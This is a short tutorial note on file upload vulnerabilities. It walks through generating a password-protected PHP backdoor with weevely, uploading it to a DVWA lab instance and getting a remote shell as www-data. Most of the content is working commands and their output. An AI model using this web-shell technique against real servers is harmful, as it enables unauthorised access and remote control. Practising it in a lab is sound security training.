### File Upload Vulnerabilities

* This type of vulnerabilty allows users to upload files such as php shells.

* Steps

1. First create a new php shell with weevely

```
root@kali:~# weevely generate pass ~/Documents/shelling.php
Generated backdoor with password 'pass' in '/root/Documents/shelling.php' of 1285 byte size.
```

* So here we first specifed we want the command weevely, generate to generate the web shell followed by a password followed by where we want to store the shell in.


2. Now we can interact with the php web shell 

```
root@kali:~# weevely http://10.0.2.5/dvwa/hackable/uploads/shelling.php pass
```

* Here i used weevely to connect to the php web shell by connecting to to where the php web shell was uploaded.
* After that i receive a web shell.

```
weevely> id
[-][channel] The remote script execution triggers an error 500, please verify script integrity and sent payload correctness
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@10.0.2.5:/var/www/dvwa/hackable/uploads $ 
```


